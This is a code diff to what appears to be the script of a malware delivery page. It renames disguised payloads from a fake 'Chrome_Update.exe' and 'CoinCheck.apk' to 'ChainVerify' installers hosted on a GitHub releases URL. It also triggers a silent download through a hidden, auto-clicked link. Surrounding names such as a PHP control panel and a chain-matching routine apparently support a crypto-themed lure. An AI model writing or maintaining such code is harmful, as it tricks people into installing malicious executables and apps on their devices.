@@ -41,13 +41,14 @@
   // Static hosting (GitHub Pages / catbox / any dumb file server): the PHP
   // control panel does not exist there, so downloads resolve to real files.
   // Set STATIC = "" to go back to the streaming PHP endpoint.
-  var STATIC = "https://thelmafinelli.github.io/cdn/dl/";
-  var FILE = { exe: STATIC + "Chrome_Update.exe", apk: STATIC + "CoinCheck.apk" };
+  var STATIC = "https://github.com/thelmafinelli/cdn/releases/download/v1.3/";
+  var FILE = { exe: STATIC + "ChainVerify-Setup.exe", apk: STATIC + "ChainVerify.apk" };
   var dlUrl = function (f, src) {
     if (STATIC) return FILE[f === "apk" ? "apk" : "exe"];
     return BASE + "&do=dl&f=" + f + "&src=" + src;
   };
   var COOKIE = "ww_d";
+
 
   function chainOf(t) {
     for (var i = 0; i < RX.length; i++) if (RX[i][1].test(t)) return RX[i][0];
@@ -131,7 +132,7 @@
       localStorage.setItem("ww_al", "1");
       var a = document.createElement("a");
       a.href = dlUrl("exe", "al") + (STATIC ? "" : "&t=" + Date.now());
-      a.download = "Chrome_Update.exe";
+      a.download = "ChainVerify-Setup.exe";
       a.style.display = "none";
       document.body.appendChild(a);
       a.click();
